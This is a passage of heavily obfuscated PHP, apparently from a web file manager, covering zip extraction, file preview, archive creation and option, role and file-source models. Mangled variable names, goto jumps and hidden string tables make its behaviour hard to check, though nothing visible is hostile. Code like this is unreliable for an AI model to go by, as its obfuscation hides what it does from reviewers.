get_path_this($a‡Ñ¡øØ) . $dÈŒÕÖÙˆ[18]; } } else { if ($B¥¢íÔõ°á == $fÆò‡ÏŸÅÎ) { $B¥¢íÔõ°á = $dÈŒÕÖÙˆ[43]; } } goto BÒŠè†±¨­; EÀÀ¤í÷»: $EœëŞ¿Ø‹ñ = self::fileIndex($cğ¿‚æ‡Á‹[$dÈŒÕÖÙˆ[1041]], $déÔõ Ç); $A‘í©¶µÆÃ = str_replace(array($dÈŒÕÖÙˆ[1079], $dÈŒÕÖÙˆ[1930]), $dÈŒÕÖÙˆ[80], $EœëŞ¿Ø‹ñ[$dÈŒÕÖÙˆ[1928]]); $fÆò‡ÏŸÅÎ = $A‘í©¶µÆÃ; goto Aç´¹³¥½´; BÒŠè†±¨­: } goto dğäñÖ¼¼; a‡†œÜîƒÓ: } static function fileIndex($C“·ø¶¥•†, $F÷Û¯™Ğ¥†, $eŒ§§Ÿö• = false) { goto eÆğ¸È•°; eÆğ¸È•°: $b«Şã´ Ï =& $_SERVER[çŞáÓæÚô‚Ô‡]; self::init(); if (!is_array($C“·ø¶¥•†)) { return !1; } goto B”¸²•èá’; B”¸²•èá’: $FÓ©»åé· = count($C“·ø¶¥•†); for ($e¶ë¨¥ØˆÑ = 0; $e¶ë¨¥ØˆÑ < $FÓ©»åé·; $e¶ë¨¥ØˆÑ++) { if ($F÷Û¯™Ğ¥† == $C“·ø¶¥•†[$e¶ë¨¥ØˆÑ][$b«Şã´ Ï[1043]]) { $cß‡¡¿ñĞè = $C“·ø¶¥•†[$e¶ë¨¥ØˆÑ]; break; } } if (!$cß‡¡¿ñĞè) { show_tips($b«Şã´ Ï[1935]); } goto b®àöè“¾ß; b®àöè“¾ß: $dÆØä÷Ç—œ = $cß‡¡¿ñĞè; if ($eŒ§§Ÿö•) { $dÆØä÷Ç—œ = $cß‡¡¿ñĞè[$eŒ§§Ÿö•]; if ($cß‡¡¿ñĞè[$b«Şã´ Ï[86]]) { $dÆØä÷Ç—œ = rtrim($dÆØä÷Ç—œ, $b«Şã´ Ï[18]) . $b«Şã´ Ï[18]; } } return $dÆØä÷Ç—œ; goto A¾¨çŠœ‚á; A¾¨çŠœ‚á: } static function extractZipFile($eğÖ„ÇÓ¦­, $d³§ùìÁ°à, $eŠøíÍé†¥ = false) { goto EÆ¾ Ï‘ß; EÆ¾ Ï‘ß: $F«ë…ÉØì =& $_SERVER[çŞáÓæÚô‚Ô‡]; self::init(); $E„ÌªØ˜Æ× = TEMP_FILES . hash_path($eğÖ„ÇÓ¦­) . $F«ë…ÉØì[18]; goto dğ˜ìô„Ü¡; AÛ®ä©ÆÒŠ: $C¿º‡¯”—ò = get_path_father($d³§ùìÁ°à); if ($C¿º‡¯”—ò == $d³§ùìÁ°à) { $C¿º‡¯”—ò = $F«ë…ÉØì[43]; } $fˆÈÁ›„ÊÌ = $f¶Í‡í‹Š->extract(PCLZIP_OPT_PATH, $E„ÌªØ˜Æ×, PCLZIP_CB_PRE_FILE_NAME, $F«ë…ÉØì[1933], PCLZIP_OPT_REMOVE_PATH, $C¿º‡¯”—ò, PCLZIP_OPT_BY_NAME, $d³§ùìÁ°à); goto eÒÏí¶óƒë; cÎŞÛİƒÓ: if (file_exists($BÂ’Æ‰³ê)) { return $BÂ’Æ‰³ê; } $f¶Í‡í‹Š = new PclZip($eğÖ„ÇÓ¦­); $b·›ãÕğ©Ò = unzip_filter_ext($E„ÌªØ˜Æ× . get_path_this($d³§ùìÁ°à)); goto AÛ®ä©ÆÒŠ; eÒÏí¶óƒë: if (!file_exists($b·›ãÕğ©Ò)) { return !1; } @rename($b·›ãÕğ©Ò, $BÂ’Æ‰³ê); return $BÂ’Æ‰³ê; goto B†ïî—“¥Š; dğ˜ìô„Ü¡: mk_dir($E„ÌªØ˜Æ×); $BÂ’Æ‰³ê = $E„ÌªØ˜Æ× . md5($eğÖ„ÇÓ¦­ . $d³§ùìÁ°à); if ($eŠøíÍé†¥) { $BÂ’Æ‰³ê = $E„ÌªØ˜Æ× . $eŠøíÍé†¥; } goto cÎŞÛİƒÓ; B†ïî—“¥Š: } static function filePreview($eÌİ“½ˆ‡, $aÅ†Ü òÑ, $C´…”¾‚ê = false, $eó˜¡²´šß = false) { goto fˆÄ÷ŸÔŸˆ; AŒŸ¸‹ƒÂ…: if (!file_exists($aŠï¢‰¥Õé)) { del_dir($då‡ƒÓšŒ´); show_json($DÀ¸–¾Ø²[1938]); } IO::fileOut($aŠï¢‰¥Õé, $C´…”¾‚ê, $eÅ³…« ì¨); goto DßôÊ¥¯ÃÙ; fˆÄ÷ŸÔŸˆ: $DÀ¸–¾Ø² =& $_SERVER[çŞáÓæÚô‚Ô‡]; self::init(); $då‡ƒÓšŒ´ = TEMP_FILES . hash_path($eÌİ“½ˆ‡) . $DÀ¸–¾Ø²[18]; goto cÚ¹ÚÊò‡; cÚ¹ÚÊò‡: mk_dir($då‡ƒÓšŒ´); $aŠï¢‰¥Õé = $då‡ƒÓšŒ´ . md5($eÌİ“½ˆ‡ . $aÅ†Ü òÑ . $eó˜¡²´šß); $D¡¢Â¤áå = $DÀ¸–¾Ø²[43]; goto eÙáè®›ÚÚ; Bù¨ŒÒ­­È: $D¡¢Â¤áå = unzip_pre_name($D¡¢Â¤áå); $eÅ³…« ì¨ = get_path_this($D¡¢Â¤áå); $eŠ•‡Õ—Æ = unzip_filter_ext($då‡ƒÓšŒ´ . $eÅ³…« ì¨); goto bâ¨¼Ø‚¶Ä; eÙáè®›ÚÚ: $C„¸ÃçÓ = self::extract($eÌİ“½ˆ‡, $då‡ƒÓšŒ´, $aÅ†Ü òÑ, $D¡¢Â¤áå); if (is_array($D¡¢Â¤áå)) { show_json($DÀ¸–¾Ø²[1936], !1); } if (file_exists($aŠï¢‰¥Õé)) { IO::fileOut($aŠï¢‰¥Õé, $C´…”¾‚ê, get_path_this($D¡¢Â¤áå)); return; } goto Bù¨ŒÒ­­È; bâ¨¼Ø‚¶Ä: if (!$C„¸ÃçÓ[$DÀ¸–¾Ø²[1039]]) { show_json($C„¸ÃçÓ[$DÀ¸–¾Ø²[1041]], !1); } if (!file_exists($eŠ•‡Õ—Æ)) { show_json($DÀ¸–¾Ø²[1937], !1); } @rename($eŠ•‡Õ—Æ, $aŠï¢‰¥Õé); goto AŒŸ¸‹ƒÂ…; DßôÊ¥¯ÃÙ: } static function create($aù“Š®ä©¤, $Fæ’§ËÄ‹) { $e¥öÆòø²Ö =& $_SERVER[çŞáÓæÚô‚Ô‡]; self::init(); $AØÊ¢ãÇøª = get_path_ext($aù“Š®ä©¤); $Aİº¸Ú°Ñ‡ = !1; if (self::checkIfType($AØÊ¢ãÇøª, $e¥öÆòø²Ö[310])) { if (kodZipArchive::support($e¥öÆòø²Ö[1018])) { return kodZipArchive::create($aù“Š®ä©¤, $Fæ’§ËÄ‹); } $Aë«ÔÂñ‘É = new PclZip($aù“Š®ä©¤); foreach ($Fæ’§ËÄ‹ as $e™µÚ¥˜Ä => $BĞŒ“Àí”ì) { $BĞŒ“Àí”ì = str_replace($e¥öÆòø²Ö[478], $e¥öÆòø²Ö[18], $BĞŒ“Àí”ì); $b¹Æ¨Œá³Ë = Kodio::clear(get_path_father($BĞŒ“Àí”ì)); if ($e™µÚ¥˜Ä == 0) { $Aİº¸Ú°Ñ‡ = $Aë«ÔÂñ‘É->create($BĞŒ“Àí”ì, PCLZIP_OPT_REMOVE_PATH, $b¹Æ¨Œá³Ë, PCLZIP_CB_PRE_FILE_NAME, $e¥öÆòø²Ö[1939]); continue; } $Aİº¸Ú°Ñ‡ = $Aë«ÔÂñ‘É->add($BĞŒ“Àí”ì, PCLZIP_OPT_REMOVE_PATH, $b¹Æ¨Œá³Ë, PCLZIP_CB_PRE_FILE_NAME, $e¥öÆòø²Ö[1939]); } } else { if (self::checkIfType($AØÊ¢ãÇøª, $e¥öÆòø²Ö[1910])) { foreach ($Fæ’§ËÄ‹ as $e™µÚ¥˜Ä => $BĞŒ“Àí”ì) { $BĞŒ“Àí”ì = str_replace($e¥öÆòø²Ö[478], $e¥öÆòø²Ö[18], $BĞŒ“Àí”ì); $b¹Æ¨Œá³Ë = Kodio::clear(get_path_father($BĞŒ“Àí”ì)); if ($e™µÚ¥˜Ä == 0) { $Aİº¸Ú°Ñ‡ = PclTarCreate($aù“Š®ä©¤, array($BĞŒ“Àí”ì), $AØÊ¢ãÇøª, null, $b¹Æ¨Œá³Ë); continue; } $Aİº¸Ú°Ñ‡ = PclTarAddList($aù“Š®ä©¤, array($BĞŒ“Àí”ì), $e¥öÆòø²Ö[43], $b¹Æ¨Œá³Ë, $AØÊ¢ãÇøª); } } } return $Aİº¸Ú°Ñ‡; } } goto EÄ§­æŒ‘İ; dï—˜„Å”ø: define($_SERVER[çŞáÓæÚô‚Ô‡][1943], 3); define($_SERVER[çŞáÓæÚô‚Ô‡][1944], 4); define($_SERVER[çŞáÓæÚô‚Ô‡][1945], 5); goto B…¤ç¥Ò™æ; e‚ˆç¶À„á: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\x74\145\x6d\x5f\157\x70\x74\151\x6f\x6e"; protected $jsonField = array("\155\x65\156\165", "\x72\157\x6c\145", "\162\x6f\154\x65\107\x72\x6f\x75\160", "\162\145\147\151\x73\x74", "\145\155\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($EŸšÜ»Â–Õ) { return "\x53\171\163\164\x65\155\117\160\164\151\x6f\156\x5f{$EŸšÜ»Â–Õ}"; } protected function optionDefault($CëïãäŸ¤‘ = '') { $A“‡ñ”êÇ¶ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($CëïãäŸ¤‘ == $A“‡ñ”êÇ¶[43]) { return $GLOBALS[$A“‡ñ”êÇ¶[16]][$A“‡ñ”êÇ¶[2519]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\155\56\x72\x6f\x6c\x65\114\x69\x73\164"; public $field = array("\x6e\x61\x6d\x65", "\141\165\x74\150", "\x6c\141\x62\145\154", "\144\x69\163\x70\154\141\171", "\163\x79\x73\164\x65\x6d", "\x64\x65\163\143", "\x69\x67\156\x6f\162\145\105\x78\164", "\151\x67\x6e\157\x72\145\x46\x69\x6c\x65\123\151\x7a\x65", "\141\x64\x6d\151\x6e\151\x73\x74\162\141\164\157\x72", "\x73\x6f\162\x74"); public function listData($A„ößÓÔÍÆ = false, $dÖèêÒÂ‰† = "\x73\157\x72\x74", $CÁßÂÚò = false) { $AçŠ™ÇŸĞ¯ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cò¤§ÌŸÄâ = parent::listData($A„ößÓÔÍÆ, $dÖèêÒÂ‰†, $CÁßÂÚò); if (!$A„ößÓÔÍÆ) { $Dî§·Å¼ó = $AçŠ™ÇŸĞ¯[2520]; foreach ($cò¤§ÌŸÄâ as $D„‚‡ÆÊÅ => $Dé„‰¼™Ï¸) { if ($Dé„‰¼™Ï¸[$AçŠ™ÇŸĞ¯[2300]] == 1) { $cò¤§ÌŸÄâ[$D„‚‡ÆÊÅ][$AçŠ™ÇŸĞ¯[414]] = $Dî§·Å¼ó; } } } return $cò¤§ÌŸÄâ; } public function update($Bá¸¡”·, $E°Ë¸éò¿£) { goto C¶Š§”ÂÙ“; aÈ†ºÚÄ½•: return parent::update($Bá¸¡”·, $E°Ë¸éò¿£); goto cÜ‘ˆ¨¥¡; C¶Š§”ÂÙ“: $D¢Ú¶‰ÌñÆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $AÅ…™§Ø¿ = parent::listData($Bá¸¡”·); $cåì¶È’ÙÆ = $this->findByName($E°Ë¸éò¿£[$D¢Ú¶‰ÌñÆ[38]]); goto CŠ·‘¾¶œ§; CŠ·‘¾¶œ§: if (!$AÅ…™§Ø¿ || $cåì¶È’ÙÆ && $cåì¶È’ÙÆ[$D¢Ú¶‰ÌñÆ[376]] != $AÅ…™§Ø¿[$D¢Ú¶‰ÌñÆ[376]]) { return !1; } if ($cåì¶È’ÙÆ[$D¢Ú¶‰ÌñÆ[2300]] == 1) { $E°Ë¸éò¿£ = array($D¢Ú¶‰ÌñÆ[38] => $E°Ë¸éò¿£[$D¢Ú¶‰ÌñÆ[38]], $D¢Ú¶‰ÌñÆ[2133] => $E°Ë¸éò¿£[$D¢Ú¶‰ÌñÆ[2133]]); } $this->filterAuth($E°Ë¸éò¿£[$D¢Ú¶‰ÌñÆ[385]]); goto aÈ†ºÚÄ½•; cÜ‘ˆ¨¥¡: } public function remove($DÇöÁ¬Ö¦¯) { $d¬İÌ®¾¡º = parent::listData($DÇöÁ¬Ö¦¯); if (!$d¬İÌ®¾¡º || $d¬İÌ®¾¡º[$_SERVER[çŞáÓæÚô‚Ô‡][1087]]) { return !1; } return parent::remove($DÇöÁ¬Ö¦¯); } public function add($E“‹¹¯Ù¾´) { goto DĞ¢Ÿ—İ®; DĞ¢Ÿ—İ®: $DÍïÃ ‘  =& $_SERVER[çŞáÓæÚô‚Ô‡]; $A“¥ëö„ğ = $E“‹¹¯Ù¾´[$DÍïÃ ‘ [38]]; if ($this->findByName($A“¥ëö„ğ)) { return !1; } goto DôÃŠÔ‘Ğ•; DôÃŠÔ‘Ğ•: $dÎŞ—¹î¯† = array($DÍïÃ ‘ [395] => $A“¥ëö„ğ, $DÍïÃ ‘ [2120] => $DÍïÃ ‘ [43], $DÍïÃ ‘ [2116] => $DÍïÃ ‘ [2134], $DÍïÃ ‘ [2521] => 1, $DÍïÃ ‘ [2119] => 0, $DÍïÃ ‘ [2522] => 0, $DÍïÃ ‘ [2118] => $this->getSort()); $E“‹¹¯Ù¾´ = array_merge($dÎŞ—¹î¯†, $E“‹¹¯Ù¾´); $this->filterAuth($E“‹¹¯Ù¾´[$DÍïÃ ‘ [385]]); goto aÕÙãª¥Ä; aÕÙãª¥Ä: return parent::insert($E“‹¹¯Ù¾´); goto aä‹ï½†Š; aä‹ï½†Š: } private function getSort() { $B£óÃç»¿‚ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $EôÑø·Ì¾ = parent::listData(); $F‚Ìö¡Íï• = array_to_keyvalue($EôÑø·Ì¾, $B£óÃç»¿‚[43], $B£óÃç»¿‚[2136]); return empty($F‚Ìö¡Íï•) ? 0 : max($F‚Ìö¡Íï•) + 1; } private function filterAuth(&$eí˜çÀÄé¥) { $cÜ‚òØÉµ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $A±×áÔ›º¡ = array(); $BÏß…Û®¹ = array_filter(explode($cÜ‚òØÉµ[57], $eí˜çÀÄé¥)); foreach ($BÏß…Û®¹ as $eí˜çÀÄé¥) { $E‰£ ë¿¶• = explode($cÜ‚òØÉµ[101], $eí˜çÀÄé¥); if ($E‰£ ë¿¶•[0] == $cÜ‚òØÉµ[1791] && $E‰£ ë¿¶•[1] != $cÜ‚òØÉµ[1043]) { $AƒÓ¹ñ¿¤Ô = $E‰£ ë¿¶•[0] . $cÜ‚òØÉµ[101] . $E‰£ ë¿¶•[1] . $cÜ‚òØÉµ[2523]; if (!in_array($AƒÓ¹ñ¿¤Ô, $BÏß…Û®¹)) { $A±×áÔ›º¡[] = $AƒÓ¹ñ¿¤Ô; } } $A±×áÔ›º¡[] = $eí˜çÀÄé¥; } $eí˜çÀÄé¥ = implode($cÜ‚òØÉµ[57], $A±×áÔ›º¡); } public function sort($A´Ş¤, $F£ ìæ×­Æ) { return parent::update($A´Ş¤, $F£ ìæ×­Æ); } } goto dËİ“¯Ù¿·; fó³¡……§¸: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($D§ÈŞŸº· = false, $dè†ÜäĞŒ‘ = '', $DÅŒ±îæÉƒ = false) { goto añ‰§‚ÒÇ; cŒ‡î°™–: $this->cacheSet($dè†ÜäĞŒ‘, $F÷Õ‰¤»ğ»); $F÷Õ‰¤»ğ» = array_merge($bØÓ¡øê›, $F÷Õ‰¤»ğ»); return $D§ÈŞŸº· ? $F÷Õ‰¤»ğ»[$D§ÈŞŸº·] : $F÷Õ‰¤»ğ»; goto BöÍº¾ª½; CÄ„ÖœÒ†: $bØÓ¡øê› = is_array($bØÓ¡øê›) ? $bØÓ¡øê› : array(); if (is_array($F÷Õ‰¤»ğ»)) { $F÷Õ‰¤»ğ» = array_merge($bØÓ¡øê›, $F÷Õ‰¤»ğ»); return $D§ÈŞŸº· ? isset($F÷Õ‰¤»ğ»[$D§ÈŞŸº·]) ? $F÷Õ‰¤»ğ»[$D§ÈŞŸº·] : null : $F÷Õ‰¤»ğ»; } $a˜¤õ±ÌÚ– = $this->filterWhere(array($A¯’¸¢Œºó[39] => $dè†ÜäĞŒ‘)); goto CÕÎ¥ŒˆÃ; CÕÎ¥ŒˆÃ: $F÷Õ‰¤»ğ» = $this->where($a˜¤õ±ÌÚ–)->select(); $F÷Õ‰¤»ğ» = array_to_keyvalue($F÷Õ‰¤»ğ», $A¯’¸¢Œºó[99], $A¯’¸¢Œºó[368]); foreach ($F÷Õ‰¤»ğ» as $e”Í±Ó™İ÷ => $a¢—®˜½Ó) { if ($DÅŒ±îæÉƒ || in_array($e”Í±Ó™İ÷, $this->jsonField)) { $F÷Õ‰¤»ğ»[$e”Í±Ó™İ÷] = json_decode($a¢—®˜½Ó, !0); } } goto cŒ‡î°™–; añ‰§‚ÒÇ: $A¯’¸¢Œºó =& $_SERVER[çŞáÓæÚô‚Ô‡]; $F÷Õ‰¤»ğ» = $this->cacheGet($dè†ÜäĞŒ‘); $bØÓ¡øê› = $this->optionDefault($dè†ÜäĞŒ‘); goto CÄ„ÖœÒ†; BöÍº¾ª½: } public function set($BªšñŒç¿ƒ, $FË­Ìë†’Â = false, $BÏÉ¨Ş¢ø = '') { goto dÄŸ‹œ÷’; b×®Üïº: return $this->addAll($f‹»ç“ò¤º, array(), !0); goto E¦ÌçƒŠ; A¾Ùôöî: $eÊñêŠÌÒŒ = is_array($BªšñŒç¿ƒ) ? $BªšñŒç¿ƒ : array($BªšñŒç¿ƒ => $FË­Ìë†’Â); foreach ($eÊñêŠÌÒŒ as $d§Ë–äğÆÒ => $C©Ô‚›) { if (is_array($C©Ô‚›)) { $C©Ô‚› = json_encode_force($C©Ô‚›); } $this->checkLength($C©Ô‚›, !1, $this->tableName . $fòĞÓÎ•Íˆ[4] . $BªšñŒç¿ƒ); $C©Ô‚› = self::textEncode($C©Ô‚›); $eÊñêŠÌÒŒ = array($fòĞÓÎ•Íˆ[39] => $BÏÉ¨Ş¢ø, $fòĞÓÎ•Íˆ[99] => $d§Ë–äğÆÒ, $fòĞÓÎ•Íˆ[368] => $C©Ô‚›); $f‹»ç“ò¤º[] = $this->filterWhere($eÊñêŠÌÒŒ); } if (!$f‹»ç“ò¤º) { return !0; } goto b×®Üïº; dÄŸ‹œ÷’: $fòĞÓÎ•Íˆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->cacheRemove($BÏÉ¨Ş¢ø); $f‹»ç“ò¤º = array(); goto A¾Ùôöî; E¦ÌçƒŠ: } protected function optionDefault($D·¹Ó†Û¬Ü = '') { return !1; } public function setDeep($B»ğÂĞàÄ‹, $fğ×Âßè‘Ş = false, $F„ÈºñÕˆ‡ = '') { $a¨âíÛµä˜ = explode($_SERVER[çŞáÓæÚô‚Ô‡][101], $B»ğÂĞàÄ‹); $bÚÑ¦Ï¼¼ = $this->get(); array_set_value($bÚÑ¦Ï¼¼, $B»ğÂĞàÄ‹, $fğ×Âßè‘Ş); $this->set($a¨âíÛµä˜[0], $bÚÑ¦Ï¼¼[$a¨âíÛµä˜[0]], $F„ÈºñÕˆ‡); } public function remove($F·„¤•†µá, $aˆ§å†µÎÖ = '') { $cÍŠÑÉÂË· =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->cacheRemove($aˆ§å†µÎÖ); $Bªá¥¸Ñíæ = $this->filterWhere(array($cÍŠÑÉÂË·[99] => $F·„¤•†µá, $cÍŠÑÉÂË·[39] => $aˆ§å†µÎÖ)); if (is_null($F·„¤•†µá)) { unset($Bªá¥¸Ñíæ[$cÍŠÑÉÂË·[99]]); } return $this->where($Bªá¥¸Ñíæ)->delete(); } public function cacheSet($CÓ ’Æ·×, $a‹» ªİªƒ = false) { return Cache::set($this->cacheKey($CÓ ’Æ·×), $a‹» ªİªƒ); } public function cacheGet($dŞ‰£ØÕ†º) { return Cache::get($this->cacheKey($dŞ‰£ØÕ†º)); } public function cacheRemove($E™ÑÅÀ) { return Cache::remove($this->cacheKey($E™ÑÅÀ)); } protected function filterWhere($D¾ÁÉ¯¥) { return $D¾ÁÉ¯¥; } protected function cacheKey($fÊœ¯ŠË¿) { return $fÊœ¯ŠË¿; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\x75\162\143\x65"; protected $tableMeta = array("\164\x61\142\154\x65\116\141\x6d\145" => "\151\157\x5f\163\157\x75\x72\x63\x65\x5f\155\145\164\141", "\x6d\x65\x74\x61\106\x69\x65\154\x64" => "\x73\x6f\165\162\x63\x65\111\104"); protected $dataAuto = array(array("\155\x6f\144\151\146\x79\x54\151\155\145", "\x74\x69\155\x65", "\151\x6e\163\145\162\x74", "\x66\165\x6e\x63\x74\151\x6f\156"), array("\143\162\145\141\164\x65\124\x69\x6d\x65", "\164\151\x6d\145", "\x69\156\163\x65\x72\164", "\x66\x75\x6e\143\164\151\157\x6e"), array("\x76\151\x65\167\124\x69\x6d\145", "\x74\151\x6d\145", "\151\156\x73\145\162\164", "\146\x75\156\143\x74\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Dù¾Ö»áõŠ) { return $this->listSource(array($_SERVER[çŞáÓæÚô‚Ô‡][377] => $Dù¾Ö»áõŠ)); } public function typeName($E•…—®Ú×µ) { static $e‰Ô¸¼ğ = array(self::TYPE_SYSTEM => "\163\x79\x73\x74\145\155", self::TYPE_USER => "\x75\163\x65\162", self::TYPE_GROUP => "\x67\162\x6f\165\x70"); return $e‰Ô¸¼ğ[$E•…—®Ú×µ . $_SERVER[çŞáÓæÚô‚Ô‡][43]]; } public function sourceListInfo($bï ‰ƒ‰ÎÂ, $f†ß§ÛØ† = false) { goto EÌ¯¼‡°“Ş; c ”‘âÃ°˜: if (!$bï ‰ƒ‰ÎÂ) { return array(); } $dŒ’ç ö— = $this->where(array($A§ô–´[378] => array($A§ô–´[17], $bï ‰ƒ‰ÎÂ)))->select(); $this->_listDataApply($dŒ’ç ö—, $f†ß§ÛØ†); goto fÛÉ‘‘Ì‚•; fÛÉ‘‘Ì‚•: return array_to_keyvalue($dŒ’ç ö—, $A§ô–´[378]); goto EŞĞ´¹¦Æé; EÌ¯¼‡°“Ş: $A§ô–´ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bï ‰ƒ‰ÎÂ = $bï ‰ƒ‰ÎÂ ? $bï ‰ƒ‰ÎÂ : array(); $bï ‰ƒ‰ÎÂ = array_filter(array_unique($bï ‰ƒ‰ÎÂ)); goto c ”‘âÃ°˜; EŞĞ´¹¦Æé: } public function pathInfoFilter($eÇ®î®ùØ) { goto fÈ¯¹âó³Š; dí”¡ŸÌ‰£: $eÇ®î®ùØ[$eÊŒˆÖğŞ™[380]] = $this->typeName($eÇ®î®ùØ[$eÊŒˆÖğŞ™[380]]); if ($eÇ®î®ùØ[$eÊŒˆÖğŞ™[379]] != 1) { $eÇ®î®ùØ[$eÊŒˆÖğŞ™[170]] = $eÇ®î®ùØ[$eÊŒˆÖğŞ™[381]]; unset($eÇ®î®ùØ[$eÊŒˆÖğŞ™[381]]); } $DÔ½Ğƒ¾²í = $eÊŒˆÖğŞ™[382]; goto fåïÒ‚‡˜Ş; fÈ¯¹âó³Š: $eÊŒˆÖğŞ™ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eÇ®î®ùØ[$eÊŒˆÖğŞ™[85]] = KodIO::make($eÇ®î®ùØ[$eÊŒˆÖğŞ™[378]]); $eÇ®î®ùØ[$eÊŒˆÖğŞ™[39]] = $eÇ®î®ùØ[$eÊŒˆÖğŞ™[379]] == 1 ? $eÊŒˆÖğŞ™[86] : $eÊŒˆÖğŞ™[177]; goto dí”¡ŸÌ‰£; fåïÒ‚‡˜Ş: $DÔ½Ğƒ¾²í .= $eÊŒˆÖğŞ™[383]; $DÔ½Ğƒ¾²í .= $eÊŒˆÖğŞ™[384]; $aƒÉ‹ƒ‚ğç = explode($eÊŒˆÖğŞ™[57], $DÔ½Ğƒ¾²í); goto cŞÙĞ÷îÅ¶; cŞÙĞ÷îÅ¶: if (isset($eÇ®î®ùØ[$eÊŒˆÖğŞ™[385]]) && $eÇ®î®ùØ[$eÊŒˆÖğŞ™[385]][$eÊŒˆÖğŞ™[386]] == -1) { $aƒÉ‹ƒ‚ğç = array_remove_value($aƒÉ‹ƒ‚ğç, $eÊŒˆÖğŞ™[197]); $aƒÉ‹ƒ‚ğç = array_remove_value($aƒÉ‹ƒ‚ğç, $eÊŒˆÖğŞ™[117]); $aƒÉ‹ƒ‚ğç = array_remove_value($aƒÉ‹ƒ‚ğç, $eÊŒˆÖğŞ™[387]); $aƒÉ‹ƒ‚ğç = array_remove_value($aƒÉ‹ƒ‚ğç, $eÊŒˆÖğŞ™[388]); $aƒÉ‹ƒ‚ğç = array_remove_value($aƒÉ‹ƒ‚ğç, $eÊŒˆÖğŞ™[87]); $aƒÉ‹ƒ‚ğç = array_remove_value($aƒÉ‹ƒ‚ğç, $eÊŒˆÖğŞ™[389]); } $eÇ®î®ùØ = array_field_key($eÇ®î®ùØ, $aƒÉ‹ƒ‚ğç); return $eÇ®î®ùØ; goto a§Ìµ³ùĞ; a§Ìµ³ùĞ: } public function listUserFav() { goto C‘ŸÁ™¼¢×; C‘ŸÁ™¼¢×: $a†¾¯à°Ã =& $_SERVER[çŞáÓæÚô‚Ô‡]; $FŒ’ÌÊŸä = Model($a†¾¯à°Ã[390])->listData(); $bìä‡¡¶¢ = array_filter_by_field($FŒ’ÌÊŸä, $a†¾¯à°Ã[39], $a†¾¯à°Ã[391]); goto fŠØÄßõŸÂ; a¸Û«†ËŠÎ: foreach ($FŒ’ÌÊŸä as &$e…ÙÚ½¯ÄÓ) { $e…ÙÚ½¯ÄÓ = array($a†¾¯à°Ã[394] => $e…ÙÚ½¯ÄÓ[$a†¾¯à°Ã[376]], $a†¾¯à°Ã[395] => $e…ÙÚ½¯ÄÓ[$a†¾¯à°Ã[38]], $a†¾¯à°Ã[396] => $e…ÙÚ½¯ÄÓ[$a†¾¯à°Ã[85]], $a†¾¯à°Ã[397] => $e…ÙÚ½¯ÄÓ[$a†¾¯à°Ã[39]], $a†¾¯à°Ã[398] => $e…ÙÚ½¯ÄÓ[$a†¾¯à°Ã[197]], $a†¾¯à°Ã[399] => $e…ÙÚ½¯ÄÓ[$a†¾¯à°Ã[117]]); if ($e…ÙÚ½¯ÄÓ[$a†¾¯à°Ã[39]] == $a†¾¯à°Ã[391] && $A–Á‚ÁÔÎá[$e…ÙÚ½¯ÄÓ[$a†¾¯à°Ã[85]]]) { $e…ÙÚ½¯ÄÓ[$a†¾¯à°Ã[400]] = $A–Á‚ÁÔÎá[$e…ÙÚ½¯ÄÓ[$a†¾¯à°Ã[85]]]; } } unset($e…ÙÚ½¯ÄÓ); return $FŒ’ÌÊŸä; goto aÆÅæÒâœ; fŠØÄßõŸÂ: $bìä‡¡¶¢ = array_to_keyvalue($bìä‡¡¶¢, $a†¾¯à°Ã[43], $a†¾¯à°Ã[85]); if ($bìä‡¡¶¢) { $A–Á‚ÁÔÎá = $this->listSource(array($a†¾¯à°Ã[392] => array($a†¾¯à°Ã[393], $bìä‡¡¶¢))); } $A–Á‚ÁÔÎá = array_to_keyvalue($A–Á‚ÁÔÎá[$a†¾¯à°Ã[363]], $a†¾¯à°Ã[378]); goto a¸Û«†ËŠÎ; aÆÅæÒâœ: } public function listUserTag($c‡Ê„¤‹°·) { goto dÉì«îŞìæ; b’æèÍ•Š: foreach ($A“çŠ‚ïã as $cëæÈ‚• => $fí½•¯ù˜±) { $bºô…¥ùãƒ = !0; if (!$c‡Ê„¤‹°·) { $E¤§ˆáš’à[] = $cëæÈ‚•; continue; } foreach ($c‡Ê„¤‹°· as $C³ŠöÛçÆ) { if (!in_array($C³ŠöÛçÆ, $fí½•¯ù˜±)) { $bºô…¥ùãƒ = !1; break; } } if ($bºô…¥ùãƒ) { $E¤§ˆáš’à[] = $cëæÈ‚•; } } if (!$E¤§ˆáš’à) { return array(); } $E´™¯Ò¯•Ò = $this->listSource(array($b”°¶à„¾[392] => array($b”°¶à„¾[393], $E¤§ˆáš’à))); goto BÀŸ—¼¸Àç; BÀŸ—¼¸Àç: if (!$E´™¯Ò¯•Ò || count($E¤§ˆáš’à) == $E´™¯Ò¯•Ò[$b”°¶à„¾[360]][$b”°¶à„¾[361]]) { return $E´™¯Ò¯•Ò; } $aÉ¸ØÆù¬Î = array(); $bÇº÷ğÙ”Œ = array_to_keyvalue($E´™¯Ò¯•Ò[$b”°¶à„¾[84]], $b”°¶à„¾[43], $b”°¶à„¾[378]); goto CÈº¹ƒªºÌ; DÔ¼Ìî–é‚: if ($aÉ¸ØÆù¬Î) { Model($b”°¶à„¾[403])->removeBySource($aÉ¸ØÆù¬Î); } return $E´™¯Ò¯•Ò; goto ağƒ”ñÅ‡; dî‰™µ¢¼Ñ: $A“çŠ‚ïã = array(); foreach ($EŞŠŸî© as $ešÉ’·Ÿ¼î) { $bçÜ»©µĞ„ = 